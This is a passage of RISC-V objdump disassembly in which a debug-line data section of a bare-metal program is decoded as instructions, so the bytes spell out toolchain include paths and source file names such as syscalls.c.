     598:	0004                	0x4
     59a:	0301                	addi	t1,t1,0
     59c:	0901                	addi	s2,s2,0
     59e:	0004                	0x4
     5a0:	0301                	addi	t1,t1,0
     5a2:	0901                	addi	s2,s2,0
     5a4:	0004                	0x4
     5a6:	0301                	addi	t1,t1,0
     5a8:	0901                	addi	s2,s2,0
     5aa:	0004                	0x4
     5ac:	0301                	addi	t1,t1,0
     5ae:	0901                	addi	s2,s2,0
     5b0:	0004                	0x4
     5b2:	0301                	addi	t1,t1,0
     5b4:	0905                	addi	s2,s2,1
     5b6:	0004                	0x4
     5b8:	0301                	addi	t1,t1,0
     5ba:	0901                	addi	s2,s2,0
     5bc:	0008                	0x8
     5be:	0301                	addi	t1,t1,0
     5c0:	0905                	addi	s2,s2,1
     5c2:	0004                	0x4
     5c4:	0301                	addi	t1,t1,0
     5c6:	0904                	addi	s1,sp,144
     5c8:	0008                	0x8
     5ca:	0301                	addi	t1,t1,0
     5cc:	0901                	addi	s2,s2,0
     5ce:	0008                	0x8
     5d0:	0301                	addi	t1,t1,0
     5d2:	00040903          	lb	s2,0(s0)
     5d6:	0301                	addi	t1,t1,0
     5d8:	0902                	slli	s2,s2,0x0
     5da:	0004                	0x4
     5dc:	0301                	addi	t1,t1,0
     5de:	0902                	slli	s2,s2,0x0
     5e0:	0002                	c.slli	zero,0x0
     5e2:	0301                	addi	t1,t1,0
     5e4:	0904                	addi	s1,sp,144
     5e6:	0004                	0x4
     5e8:	0301                	addi	t1,t1,0
     5ea:	0901                	addi	s2,s2,0
     5ec:	0004                	0x4
     5ee:	0301                	addi	t1,t1,0
     5f0:	0901                	addi	s2,s2,0
     5f2:	0002                	c.slli	zero,0x0
     5f4:	0301                	addi	t1,t1,0
     5f6:	0901                	addi	s2,s2,0
     5f8:	0004                	0x4
     5fa:	0301                	addi	t1,t1,0
     5fc:	0901                	addi	s2,s2,0
     5fe:	0002                	c.slli	zero,0x0
     600:	0301                	addi	t1,t1,0
     602:	0902                	slli	s2,s2,0x0
     604:	0002                	c.slli	zero,0x0
     606:	0301                	addi	t1,t1,0
     608:	0904                	addi	s1,sp,144
     60a:	0004                	0x4
     60c:	0301                	addi	t1,t1,0
     60e:	00020903          	lb	s2,0(tp) # 0 <_tdata_begin>
     612:	0301                	addi	t1,t1,0
     614:	0901                	addi	s2,s2,0
     616:	0002                	c.slli	zero,0x0
     618:	0301                	addi	t1,t1,0
     61a:	0901                	addi	s2,s2,0
     61c:	0002                	c.slli	zero,0x0
     61e:	0301                	addi	t1,t1,0
     620:	0901                	addi	s2,s2,0
     622:	0002                	c.slli	zero,0x0
     624:	0301                	addi	t1,t1,0
     626:	0901                	addi	s2,s2,0
     628:	0002                	c.slli	zero,0x0
     62a:	0301                	addi	t1,t1,0
     62c:	0901                	addi	s2,s2,0
     62e:	0002                	c.slli	zero,0x0
     630:	0301                	addi	t1,t1,0
     632:	0901                	addi	s2,s2,0
     634:	0002                	c.slli	zero,0x0
     636:	0301                	addi	t1,t1,0
     638:	0901                	addi	s2,s2,0
     63a:	0002                	c.slli	zero,0x0
     63c:	0301                	addi	t1,t1,0
     63e:	0901                	addi	s2,s2,0
     640:	0002                	c.slli	zero,0x0
     642:	0301                	addi	t1,t1,0
     644:	0901                	addi	s2,s2,0
     646:	0002                	c.slli	zero,0x0
     648:	0301                	addi	t1,t1,0
     64a:	0901                	addi	s2,s2,0
     64c:	0002                	c.slli	zero,0x0
     64e:	0301                	addi	t1,t1,0
     650:	0901                	addi	s2,s2,0
     652:	0002                	c.slli	zero,0x0
     654:	0301                	addi	t1,t1,0
     656:	0901                	addi	s2,s2,0
     658:	0002                	c.slli	zero,0x0
     65a:	0301                	addi	t1,t1,0
     65c:	0901                	addi	s2,s2,0
     65e:	0002                	c.slli	zero,0x0
     660:	0301                	addi	t1,t1,0
     662:	0901                	addi	s2,s2,0
     664:	0002                	c.slli	zero,0x0
     666:	0301                	addi	t1,t1,0
     668:	0901                	addi	s2,s2,0
     66a:	0002                	c.slli	zero,0x0
     66c:	0301                	addi	t1,t1,0
     66e:	0901                	addi	s2,s2,0
     670:	0002                	c.slli	zero,0x0
     672:	0301                	addi	t1,t1,0
     674:	0901                	addi	s2,s2,0
     676:	0002                	c.slli	zero,0x0
     678:	0301                	addi	t1,t1,0
     67a:	0901                	addi	s2,s2,0
     67c:	0002                	c.slli	zero,0x0
     67e:	0301                	addi	t1,t1,0
     680:	0901                	addi	s2,s2,0
     682:	0002                	c.slli	zero,0x0
     684:	0301                	addi	t1,t1,0
     686:	0901                	addi	s2,s2,0
     688:	0002                	c.slli	zero,0x0
     68a:	0301                	addi	t1,t1,0
     68c:	0901                	addi	s2,s2,0
     68e:	0002                	c.slli	zero,0x0
     690:	0301                	addi	t1,t1,0
     692:	0901                	addi	s2,s2,0
     694:	0002                	c.slli	zero,0x0
     696:	0301                	addi	t1,t1,0
     698:	0901                	addi	s2,s2,0
     69a:	0002                	c.slli	zero,0x0
     69c:	0301                	addi	t1,t1,0
     69e:	0901                	addi	s2,s2,0
     6a0:	0002                	c.slli	zero,0x0
     6a2:	0301                	addi	t1,t1,0
     6a4:	0901                	addi	s2,s2,0
     6a6:	0002                	c.slli	zero,0x0
     6a8:	0301                	addi	t1,t1,0
     6aa:	0901                	addi	s2,s2,0
     6ac:	0002                	c.slli	zero,0x0
     6ae:	0301                	addi	t1,t1,0
     6b0:	0901                	addi	s2,s2,0
     6b2:	0002                	c.slli	zero,0x0
     6b4:	0301                	addi	t1,t1,0
     6b6:	0901                	addi	s2,s2,0
     6b8:	0002                	c.slli	zero,0x0
     6ba:	0301                	addi	t1,t1,0
     6bc:	0901                	addi	s2,s2,0
     6be:	0002                	c.slli	zero,0x0
     6c0:	0301                	addi	t1,t1,0
     6c2:	0901                	addi	s2,s2,0
     6c4:	0002                	c.slli	zero,0x0
     6c6:	0301                	addi	t1,t1,0
     6c8:	00020903          	lb	s2,0(tp) # 0 <_tdata_begin>
     6cc:	0301                	addi	t1,t1,0
     6ce:	00040903          	lb	s2,0(s0)
     6d2:	0301                	addi	t1,t1,0
     6d4:	00040903          	lb	s2,0(s0)
     6d8:	0301                	addi	t1,t1,0
     6da:	00020903          	lb	s2,0(tp) # 0 <_tdata_begin>
     6de:	0301                	addi	t1,t1,0
     6e0:	00040903          	lb	s2,0(s0)
     6e4:	0301                	addi	t1,t1,0
     6e6:	00040903          	lb	s2,0(s0)
     6ea:	0301                	addi	t1,t1,0
     6ec:	0901                	addi	s2,s2,0
     6ee:	0008                	0x8
     6f0:	0301                	addi	t1,t1,0
     6f2:	0902                	slli	s2,s2,0x0
     6f4:	0004                	0x4
     6f6:	0301                	addi	t1,t1,0
     6f8:	0901                	addi	s2,s2,0
     6fa:	0002                	c.slli	zero,0x0
     6fc:	0301                	addi	t1,t1,0
     6fe:	0901                	addi	s2,s2,0
     700:	0002                	c.slli	zero,0x0
     702:	0301                	addi	t1,t1,0
     704:	0901                	addi	s2,s2,0
     706:	0002                	c.slli	zero,0x0
     708:	0301                	addi	t1,t1,0
     70a:	0901                	addi	s2,s2,0
     70c:	0002                	c.slli	zero,0x0
     70e:	0301                	addi	t1,t1,0
     710:	0901                	addi	s2,s2,0
     712:	0002                	c.slli	zero,0x0
     714:	0301                	addi	t1,t1,0
     716:	0901                	addi	s2,s2,0
     718:	0002                	c.slli	zero,0x0
     71a:	0301                	addi	t1,t1,0
     71c:	0901                	addi	s2,s2,0
     71e:	0002                	c.slli	zero,0x0
     720:	0301                	addi	t1,t1,0
     722:	0901                	addi	s2,s2,0
     724:	0002                	c.slli	zero,0x0
     726:	0301                	addi	t1,t1,0
     728:	0901                	addi	s2,s2,0
     72a:	0002                	c.slli	zero,0x0
     72c:	0301                	addi	t1,t1,0
     72e:	0901                	addi	s2,s2,0
     730:	0002                	c.slli	zero,0x0
     732:	0301                	addi	t1,t1,0
     734:	0901                	addi	s2,s2,0
     736:	0002                	c.slli	zero,0x0
     738:	0301                	addi	t1,t1,0
     73a:	0901                	addi	s2,s2,0
     73c:	0002                	c.slli	zero,0x0
     73e:	0301                	addi	t1,t1,0
     740:	0901                	addi	s2,s2,0
     742:	0002                	c.slli	zero,0x0
     744:	0301                	addi	t1,t1,0
     746:	0901                	addi	s2,s2,0
     748:	0002                	c.slli	zero,0x0
     74a:	0301                	addi	t1,t1,0
     74c:	0901                	addi	s2,s2,0
     74e:	0002                	c.slli	zero,0x0
     750:	0301                	addi	t1,t1,0
     752:	0901                	addi	s2,s2,0
     754:	0002                	c.slli	zero,0x0
     756:	0301                	addi	t1,t1,0
     758:	0901                	addi	s2,s2,0
     75a:	0002                	c.slli	zero,0x0
     75c:	0301                	addi	t1,t1,0
     75e:	0901                	addi	s2,s2,0
     760:	0002                	c.slli	zero,0x0
     762:	0301                	addi	t1,t1,0
     764:	0901                	addi	s2,s2,0
     766:	0002                	c.slli	zero,0x0
     768:	0301                	addi	t1,t1,0
     76a:	0901                	addi	s2,s2,0
     76c:	0002                	c.slli	zero,0x0
     76e:	0301                	addi	t1,t1,0
     770:	0901                	addi	s2,s2,0
     772:	0002                	c.slli	zero,0x0
     774:	0301                	addi	t1,t1,0
     776:	0901                	addi	s2,s2,0
     778:	0002                	c.slli	zero,0x0
     77a:	0301                	addi	t1,t1,0
     77c:	0901                	addi	s2,s2,0
     77e:	0002                	c.slli	zero,0x0
     780:	0301                	addi	t1,t1,0
     782:	0901                	addi	s2,s2,0
     784:	0002                	c.slli	zero,0x0
     786:	0301                	addi	t1,t1,0
     788:	0901                	addi	s2,s2,0
     78a:	0002                	c.slli	zero,0x0
     78c:	0301                	addi	t1,t1,0
     78e:	0901                	addi	s2,s2,0
     790:	0002                	c.slli	zero,0x0
     792:	0301                	addi	t1,t1,0
     794:	0901                	addi	s2,s2,0
     796:	0002                	c.slli	zero,0x0
     798:	0301                	addi	t1,t1,0
     79a:	0901                	addi	s2,s2,0
     79c:	0002                	c.slli	zero,0x0
     79e:	0301                	addi	t1,t1,0
     7a0:	0901                	addi	s2,s2,0
     7a2:	0002                	c.slli	zero,0x0
     7a4:	0301                	addi	t1,t1,0
     7a6:	0901                	addi	s2,s2,0
     7a8:	0002                	c.slli	zero,0x0
     7aa:	0301                	addi	t1,t1,0
     7ac:	0902                	slli	s2,s2,0x0
     7ae:	0002                	c.slli	zero,0x0
     7b0:	0301                	addi	t1,t1,0
     7b2:	0901                	addi	s2,s2,0
     7b4:	0002                	c.slli	zero,0x0
     7b6:	0901                	addi	s2,s2,0
     7b8:	0004                	0x4
     7ba:	0100                	addi	s0,sp,128
     7bc:	8801                	andi	s0,s0,0
     7be:	0000                	unimp
     7c0:	0200                	addi	s0,sp,256
     7c2:	2200                	fld	fs0,0(a2)
     7c4:	0000                	unimp
     7c6:	0100                	addi	s0,sp,128
     7c8:	fb01                	bnez	a4,6d8 <_tbss_end+0x654>
     7ca:	0d0e                	slli	s10,s10,0x3
     7cc:	0100                	addi	s0,sp,128
     7ce:	0101                	addi	sp,sp,0
     7d0:	0001                	nop
     7d2:	0000                	unimp
     7d4:	0001                	nop
     7d6:	0100                	addi	s0,sp,128
     7d8:	00637273          	csrrci	tp,0x6,6
     7dc:	7300                	ld	s0,32(a4)
     7de:	6174                	ld	a3,192(a0)
     7e0:	532e6b63          	bltu	t3,s2,d16 <_tbss_end+0xc92>
     7e4:	0100                	addi	s0,sp,128
     7e6:	0000                	unimp
     7e8:	0000                	unimp
     7ea:	0209                	addi	tp,tp,2
     7ec:	157a                	slli	a0,a0,0x3e
     7ee:	8000                	0x8000
     7f0:	0000                	unimp
     7f2:	0000                	unimp
     7f4:	09010317          	auipc	t1,0x9010
     7f8:	0002                	c.slli	zero,0x0
     7fa:	0301                	addi	t1,t1,0
     7fc:	0904                	addi	s1,sp,144
     7fe:	0002                	c.slli	zero,0x0
     800:	0301                	addi	t1,t1,0
     802:	0901                	addi	s2,s2,0
     804:	0002                	c.slli	zero,0x0
     806:	0301                	addi	t1,t1,0
     808:	0901                	addi	s2,s2,0
     80a:	0004                	0x4
     80c:	0301                	addi	t1,t1,0
     80e:	0901                	addi	s2,s2,0
     810:	0004                	0x4
     812:	0301                	addi	t1,t1,0
     814:	0901                	addi	s2,s2,0
     816:	0004                	0x4
     818:	0301                	addi	t1,t1,0
     81a:	0901                	addi	s2,s2,0
     81c:	0004                	0x4
     81e:	0301                	addi	t1,t1,0
     820:	0901                	addi	s2,s2,0
     822:	0004                	0x4
     824:	0301                	addi	t1,t1,0
     826:	0901                	addi	s2,s2,0
     828:	0004                	0x4
     82a:	0301                	addi	t1,t1,0
     82c:	0901                	addi	s2,s2,0
     82e:	0004                	0x4
     830:	0301                	addi	t1,t1,0
     832:	0901                	addi	s2,s2,0
     834:	0004                	0x4
     836:	0301                	addi	t1,t1,0
     838:	0901                	addi	s2,s2,0
     83a:	0004                	0x4
     83c:	0301                	addi	t1,t1,0
     83e:	00020903          	lb	s2,0(tp) # 0 <_tdata_begin>
     842:	0901                	addi	s2,s2,0
     844:	0002                	c.slli	zero,0x0
     846:	0100                	addi	s0,sp,128
     848:	7101                	addi	sp,sp,-512
     84a:	0011                	c.nop	4
     84c:	0300                	addi	s0,sp,384
     84e:	f600                	sd	s0,40(a2)
     850:	0001                	nop
     852:	0100                	addi	s0,sp,128
     854:	fb01                	bnez	a4,764 <_tbss_end+0x6e0>
     856:	0d0e                	slli	s10,s10,0x3
     858:	0100                	addi	s0,sp,128
     85a:	0101                	addi	sp,sp,0
     85c:	0001                	nop
     85e:	0000                	unimp
     860:	0001                	nop
     862:	0100                	addi	s0,sp,128
     864:	6e69                	lui	t3,0x1a
     866:	72730063          	beq	t1,t2,f86 <_tbss_end+0xf02>
     86a:	682f0063          	beq	t5,sp,eea <_tbss_end+0xe66>
     86e:	2f656d6f          	jal	s10,56b64 <_tbss_end+0x56ae0>
     872:	6e656863          	bltu	a0,t1,f62 <_tbss_end+0xede>
     876:	61697867          	0x61697867
     87a:	2f75796f          	jal	s2,58370 <_tbss_end+0x582ec>
     87e:	70696863          	bltu	s2,t1,f8e <_tbss_end+0xf0a>
     882:	6179                	addi	sp,sp,464
     884:	6472                	ld	s0,280(sp)
     886:	6f632e2f          	0x6f632e2f
     88a:	646e                	ld	s0,216(sp)
     88c:	2d61                	addiw	s10,s10,24
     88e:	6e65                	lui	t3,0x19
     890:	2f76                	fld	ft10,344(sp)
     892:	6972                	ld	s2,280(sp)
     894:	2d766373          	csrrsi	t1,0x2d7,12
     898:	6f74                	ld	a3,216(a4)
     89a:	2f736c6f          	jal	s8,37390 <_tbss_end+0x3730c>
     89e:	6972                	ld	s2,280(sp)
     8a0:	36766373          	csrrsi	t1,0x367,12
     8a4:	2d34                	fld	fa3,88(a0)
     8a6:	6e75                	lui	t3,0x1d
     8a8:	776f6e6b          	0x776f6e6b
     8ac:	2d6e                	fld	fs10,216(sp)
     8ae:	6c65                	lui	s8,0x19
     8b0:	2f66                	fld	ft10,88(sp)
     8b2:	6e69                	lui	t3,0x1a
     8b4:	64756c63          	bltu	a0,t2,f0c <_tbss_end+0xe88>
     8b8:	0065                	c.nop	25
     8ba:	6d6f682f          	0x6d6f682f
     8be:	2f65                	addiw	t5,t5,25
     8c0:	6e656863          	bltu	a0,t1,fb0 <_tbss_end+0xf2c>
     8c4:	61697867          	0x61697867
     8c8:	2f75796f          	jal	s2,583be <_tbss_end+0x5833a>
     8cc:	70696863          	bltu	s2,t1,fdc <_tbss_end+0xf58>
     8d0:	6179                	addi	sp,sp,464
     8d2:	6472                	ld	s0,280(sp)
     8d4:	6f632e2f          	0x6f632e2f
     8d8:	646e                	ld	s0,216(sp)
     8da:	2d61                	addiw	s10,s10,24
     8dc:	6e65                	lui	t3,0x19
     8de:	2f76                	fld	ft10,344(sp)
     8e0:	6972                	ld	s2,280(sp)
     8e2:	2d766373          	csrrsi	t1,0x2d7,12
     8e6:	6f74                	ld	a3,216(a4)
     8e8:	2f736c6f          	jal	s8,373de <_tbss_end+0x3735a>
     8ec:	6972                	ld	s2,280(sp)
     8ee:	36766373          	csrrsi	t1,0x367,12
     8f2:	2d34                	fld	fa3,88(a0)
     8f4:	6e75                	lui	t3,0x1d
     8f6:	776f6e6b          	0x776f6e6b
     8fa:	2d6e                	fld	fs10,216(sp)
     8fc:	6c65                	lui	s8,0x19
     8fe:	2f66                	fld	ft10,88(sp)
     900:	6e69                	lui	t3,0x1a
     902:	64756c63          	bltu	a0,t2,f5a <_tbss_end+0xed6>
     906:	2f65                	addiw	t5,t5,25
     908:	616d                	addi	sp,sp,240
     90a:	6e696863          	bltu	s2,t1,ffa <_tbss_end+0xf76>
     90e:	0065                	c.nop	25
     910:	6d6f682f          	0x6d6f682f
     914:	2f65                	addiw	t5,t5,25
     916:	6e656863          	bltu	a0,t1,1006 <_tbss_end+0xf82>
     91a:	61697867          	0x61697867
     91e:	2f75796f          	jal	s2,58414 <_tbss_end+0x58390>
     922:	70696863          	bltu	s2,t1,1032 <_tbss_end+0xfae>
     926:	6179                	addi	sp,sp,464
     928:	6472                	ld	s0,280(sp)
     92a:	6f632e2f          	0x6f632e2f
     92e:	646e                	ld	s0,216(sp)
     930:	2d61                	addiw	s10,s10,24
     932:	6e65                	lui	t3,0x19
     934:	2f76                	fld	ft10,344(sp)
     936:	6972                	ld	s2,280(sp)
     938:	2d766373          	csrrsi	t1,0x2d7,12
     93c:	6f74                	ld	a3,216(a4)
     93e:	2f736c6f          	jal	s8,37434 <_tbss_end+0x373b0>
     942:	6972                	ld	s2,280(sp)
     944:	36766373          	csrrsi	t1,0x367,12
     948:	2d34                	fld	fa3,88(a0)
     94a:	6e75                	lui	t3,0x1d
     94c:	776f6e6b          	0x776f6e6b
     950:	2d6e                	fld	fs10,216(sp)
     952:	6c65                	lui	s8,0x19
     954:	2f66                	fld	ft10,88(sp)
     956:	6e69                	lui	t3,0x1a
     958:	64756c63          	bltu	a0,t2,fb0 <_tbss_end+0xf2c>
     95c:	2f65                	addiw	t5,t5,25
     95e:	00737973          	csrrci	s2,0x7,6
     962:	6d6f682f          	0x6d6f682f
     966:	2f65                	addiw	t5,t5,25
     968:	6e656863          	bltu	a0,t1,1058 <_tbss_end+0xfd4>
     96c:	61697867          	0x61697867
     970:	2f75796f          	jal	s2,58466 <_tbss_end+0x583e2>
     974:	70696863          	bltu	s2,t1,1084 <_tbss_end+0x1000>
     978:	6179                	addi	sp,sp,464
     97a:	6472                	ld	s0,280(sp)
     97c:	6f632e2f          	0x6f632e2f
     980:	646e                	ld	s0,216(sp)
     982:	2d61                	addiw	s10,s10,24
     984:	6e65                	lui	t3,0x19
     986:	2f76                	fld	ft10,344(sp)
     988:	6972                	ld	s2,280(sp)
     98a:	2d766373          	csrrsi	t1,0x2d7,12
     98e:	6f74                	ld	a3,216(a4)
     990:	2f736c6f          	jal	s8,37486 <_tbss_end+0x37402>
     994:	696c                	ld	a1,208(a0)
     996:	2f62                	fld	ft10,24(sp)
     998:	2f636367          	0x2f636367
     99c:	6972                	ld	s2,280(sp)
     99e:	36766373          	csrrsi	t1,0x367,12
     9a2:	2d34                	fld	fa3,88(a0)
     9a4:	6e75                	lui	t3,0x1d
     9a6:	776f6e6b          	0x776f6e6b
     9aa:	2d6e                	fld	fs10,216(sp)
     9ac:	6c65                	lui	s8,0x19
     9ae:	2f66                	fld	ft10,88(sp)
     9b0:	2e39                	addiw	t3,t3,14
     9b2:	2e32                	fld	ft8,264(sp)
     9b4:	2f30                	fld	fa2,88(a4)
     9b6:	6e69                	lui	t3,0x1a
     9b8:	64756c63          	bltu	a0,t2,1010 <_tbss_end+0xf8c>
     9bc:	0065                	c.nop	25
     9be:	7500                	ld	s0,40(a0)
     9c0:	6974                	ld	a3,208(a0)
     9c2:	2e6c                	fld	fa1,216(a2)
     9c4:	0068                	addi	a0,sp,12
     9c6:	0001                	nop
     9c8:	7300                	ld	s0,32(a4)
     9ca:	7379                	lui	t1,0xffffe
     9cc:	6c6c6163          	bltu	s8,t1,108e <_tbss_end+0x100a>
     9d0:	00632e73          	csrrs	t3,0x6,t1
     9d4:	0002                	c.slli	zero,0x0
     9d6:	7300                	ld	s0,32(a4)
     9d8:	6474                	ld	a3,200(s0)
     9da:	6f69                	lui	t5,0x1a
     9dc:	682e                	ld	a6,200(sp)
     9de:	0300                	addi	s0,sp,384
     9e0:	0000                	unimp
     9e2:	645f 6665 7561      	0x75616665645f
     9e8:	746c                	ld	a1,232(s0)
     9ea:	745f 7079 7365      	0x73657079745f
     9f0:	682e                	ld	a6,200(sp)
     9f2:	0400                	addi	s0,sp,512
     9f4:	0000                	unimp
     9f6:	735f 6474 6e69      	0x6e696474735f
     9fc:	2e74                	fld	fa3,216(a2)
     9fe:	0068                	addi	a0,sp,12
     a00:	0005                	c.nop	1
     a02:	7300                	ld	s0,32(a4)
     a04:	6474                	ld	a3,200(s0)
     a06:	6564                	ld	s1,200(a0)
     a08:	2e66                	fld	ft8,88(sp)
     a0a:	0068                	addi	a0,sp,12
     a0c:	0006                	c.slli	zero,0x1
     a0e:	5f00                	lw	s0,56(a4)
     a10:	7974                	ld	a3,240(a0)
     a12:	6570                	ld	a2,200(a0)
     a14:	00682e73          	csrrs	t3,0x6,a6
     a18:	0005                	c.nop	1
     a1a:	7200                	ld	s0,32(a2)
     a1c:	6565                	lui	a0,0x19
     a1e:	746e                	ld	s0,248(sp)
     a20:	682e                	ld	a6,200(sp)
     a22:	0500                	addi	s0,sp,640
     a24:	0000                	unimp
     a26:	6f6c                	ld	a1,216(a4)
     a28:	682e6b63          	bltu	t3,sp,10be <_tbss_end+0x103a>
     a2c:	0500                	addi	s0,sp,640
     a2e:	0000                	unimp
     a30:	61647473          	csrrci	s0,0x616,8
     a34:	6772                	ld	a4,280(sp)
     a36:	682e                	ld	a6,200(sp)
     a38:	0600                	addi	s0,sp,768
     a3a:	0000                	unimp
     a3c:	69727473          	csrrci	s0,0x697,4
     a40:	676e                	ld	a4,216(sp)
     a42:	682e                	ld	a6,200(sp)
     a44:	0300                	addi	s0,sp,384
     a46:	0000                	unimp
     a48:	0500                	addi	s0,sp,640
     a4a:	0001                	nop
     a4c:	0209                	addi	tp,tp,2
     a4e:	15a8                	addi	a0,sp,744
     a50:	8000                	0x8000
     a52:	0000                	unimp
     a54:	0000                	unimp
     a56:	03012803          	lw	a6,48(sp)
     a5a:	0908                	addi	a0,sp,144
     a5c:	0014                	0x14
     a5e:	0301                	addi	t1,t1,0
     a60:	00080903          	lb	s2,0(a6)
     a64:	0301                	addi	t1,t1,0
     a66:	0908                	addi	a0,sp,144
     a68:	0014                	0x14
     a6a:	0301                	addi	t1,t1,0
     a6c:	00080903          	lb	s2,0(a6)
     a70:	0501                	addi	a0,a0,0
     a72:	030a                	slli	t1,t1,0x2
     a74:	00140903          	lb	s2,1(s0)
     a78:	0501                	addi	a0,a0,0
     a7a:	09000303          	lb	t1,144(zero) # 90 <_tbss_end+0xc>
     a7e:	0004                	0x4
     a80:	0501                	addi	a0,a0,0
     a82:	0312                	slli	t1,t1,0x4
     a84:	0902                	slli	s2,s2,0x0
     a86:	0002                	c.slli	zero,0x0
     a88:	0501                	addi	a0,a0,0
     a8a:	0309                	addi	t1,t1,2
     a8c:	0900                	addi	s0,sp,144
     a8e:	000c                	0xc
     a90:	0501                	addi	a0,a0,0
     a92:	0320                	addi	s0,sp,392
     a94:	0900                	addi	s0,sp,144
     a96:	0006                	c.slli	zero,0x1
     a98:	0501                	addi	a0,a0,0
     a9a:	09000317          	auipc	t1,0x9000
     a9e:	000e                	c.slli	zero,0x3
     aa0:	0501                	addi	a0,a0,0
     aa2:	0314                	addi	a3,sp,384
     aa4:	0901                	addi	s2,s2,0
     aa6:	0006                	c.slli	zero,0x1
     aa8:	0501                	addi	a0,a0,0
     aaa:	0309                	addi	t1,t1,2
     aac:	0900                	addi	s0,sp,144
     aae:	000c                	0xc
     ab0:	0501                	addi	a0,a0,0
     ab2:	0324                	addi	s1,sp,392
     ab4:	0900                	addi	s0,sp,144
     ab6:	0006                	c.slli	zero,0x1
     ab8:	0501                	addi	a0,a0,0
     aba:	0319                	addi	t1,t1,6
     abc:	0900                	addi	s0,sp,144
     abe:	000e                	c.slli	zero,0x3
     ac0:	0501                	addi	a0,a0,0
     ac2:	0308                	addi	a0,sp,384
     ac4:	0901                	addi	s2,s2,0
     ac6:	0006                	c.slli	zero,0x1
     ac8:	0501                	addi	a0,a0,0
     aca:	0402001b          	addiw	zero,tp,64
     ace:	0301                	addi	t1,t1,0
     ad0:	0900                	addi	s0,sp,144
     ad2:	0010                	0x10
     ad4:	0501                	addi	a0,a0,0
     ad6:	0308                	addi	a0,sp,384
     ad8:	0901                	addi	s2,s2,0
     ada:	000a                	c.slli	zero,0x2
     adc:	0501                	addi	a0,a0,0
     ade:	0402001b          	addiw	zero,tp,64
     ae2:	0301                	addi	t1,t1,0
     ae4:	0900                	addi	s0,sp,144
     ae6:	0010                	0x10
     ae8:	0001                	nop
     aea:	0402                	slli	s0,s0,0x0
     aec:	0302                	slli	t1,t1,0x0
     aee:	000a097b          	0xa097b
     af2:	0501                	addi	a0,a0,0
     af4:	0014                	0x14
     af6:	0402                	slli	s0,s0,0x0
     af8:	0301                	addi	t1,t1,0
     afa:	0900                	addi	s0,sp,144
     afc:	000a                	c.slli	zero,0x2
     afe:	0501                	addi	a0,a0,0
     b00:	0016                	c.slli	zero,0x5
     b02:	0402                	slli	s0,s0,0x0
     b04:	0301                	addi	t1,t1,0
     b06:	0900                	addi	s0,sp,144
     b08:	0010                	0x10
     b0a:	0501                	addi	a0,a0,0
     b0c:	04020003          	lb	zero,64(tp) # 40 <buf.2990>
     b10:	0301                	addi	t1,t1,0
     b12:	0900                	addi	s0,sp,144
     b14:	0008                	0x8
     b16:	0501                	addi	a0,a0,0
     b18:	030d                	addi	t1,t1,3
     b1a:	000a0907          	0xa0907
     b1e:	0501                	addi	a0,a0,0
     b20:	0306                	slli	t1,t1,0x1
     b22:	0900                	addi	s0,sp,144
     b24:	0008                	0x8
     b26:	0501                	addi	a0,a0,0
     b28:	0019                	c.nop	6
     b2a:	0402                	slli	s0,s0,0x0
     b2c:	0301                	addi	t1,t1,0
     b2e:	0900                	addi	s0,sp,144
     b30:	0002                	c.slli	zero,0x0
     b32:	0501                	addi	a0,a0,0
     b34:	0028                	addi	a0,sp,8
     b36:	0402                	slli	s0,s0,0x0
     b38:	0301                	addi	t1,t1,0
     b3a:	0900                	addi	s0,sp,144
     b3c:	0014                	0x14
     b3e:	0501                	addi	a0,a0,0
     b40:	001f 0402 0301      	0x3010402001f
     b46:	0900                	addi	s0,sp,144
     b48:	000e                	c.slli	zero,0x3
     b4a:	0501                	addi	a0,a0,0
     b4c:	0012                	c.slli	zero,0x4
     b4e:	0402                	slli	s0,s0,0x0
     b50:	0301                	addi	t1,t1,0
     b52:	0900                	addi	s0,sp,144
     b54:	0002                	c.slli	zero,0x0
     b56:	0501                	addi	a0,a0,0
     b58:	030c                	addi	a1,sp,384
     b5a:	0901                	addi	s2,s2,0
     b5c:	0006                	c.slli	zero,0x1
     b5e:	0501                	addi	a0,a0,0
     b60:	030a                	slli	t1,t1,0x2
     b62:	0901                	addi	s2,s2,0
     b64:	0006                	c.slli	zero,0x1
     b66:	0501                	addi	a0,a0,0
     b68:	0301                	addi	t1,t1,0
     b6a:	0901                	addi	s2,s2,0
     b6c:	0002                	c.slli	zero,0x0
     b6e:	0301                	addi	t1,t1,0
     b70:	00080903          	lb	s2,0(a6)
     b74:	0501                	addi	a0,a0,0
     b76:	030a                	slli	t1,t1,0x2
     b78:	00140903          	lb	s2,1(s0)
     b7c:	0501                	addi	a0,a0,0
     b7e:	09000303          	lb	t1,144(zero) # 90 <_tbss_end+0xc>
     b82:	0004                	0x4
     b84:	0501                	addi	a0,a0,0
     b86:	0315                	addi	t1,t1,5
     b88:	0902                	slli	s2,s2,0x0
     b8a:	0002                	c.slli	zero,0x0
     b8c:	0501                	addi	a0,a0,0
     b8e:	030c                	addi	a1,sp,384
     b90:	0900                	addi	s0,sp,144
     b92:	000c                	0xc
     b94:	0501                	addi	a0,a0,0
     b96:	09000323          	sb	a6,134(zero) # 86 <_tbss_end+0x2>
     b9a:	0006                	c.slli	zero,0x1
     b9c:	0501                	addi	a0,a0,0
     b9e:	031a                	slli	t1,t1,0x6
     ba0:	0900                	addi	s0,sp,144
     ba2:	000e                	c.slli	zero,0x3
     ba4:	0501                	addi	a0,a0,0
     ba6:	09010317          	auipc	t1,0x9010
     baa:	0006                	c.slli	zero,0x1
     bac:	0501                	addi	a0,a0,0
     bae:	030c                	addi	a1,sp,384
     bb0:	0900                	addi	s0,sp,144
     bb2:	000c                	0xc
     bb4:	0501                	addi	a0,a0,0
     bb6:	09000327          	0x9000327
     bba:	0006                	c.slli	zero,0x1
     bbc:	0501                	addi	a0,a0,0
     bbe:	031c                	addi	a5,sp,384
     bc0:	0900                	addi	s0,sp,144
     bc2:	000e                	c.slli	zero,0x3
     bc4:	0501                	addi	a0,a0,0
     bc6:	0312                	slli	t1,t1,0x4
     bc8:	0901                	addi	s2,s2,0
     bca:	0006                	c.slli	zero,0x1
     bcc:	0501                	addi	a0,a0,0
     bce:	0309                	addi	t1,t1,2
     bd0:	0900                	addi	s0,sp,144
     bd2:	0014                	0x14
     bd4:	0501                	addi	a0,a0,0
     bd6:	0322                	slli	t1,t1,0x8
     bd8:	0900                	addi	s0,sp,144
     bda:	0004                	0x4
     bdc:	0501                	addi	a0,a0,0
     bde:	0319                	addi	t1,t1,6
     be0:	0900                	addi	s0,sp,144
     be2:	0014                	0x14
     be4:	0501                	addi	a0,a0,0
     be6:	0901030f          	0x901030f
     bea:	0004                	0x4
     bec:	0501                	addi	a0,a0,0
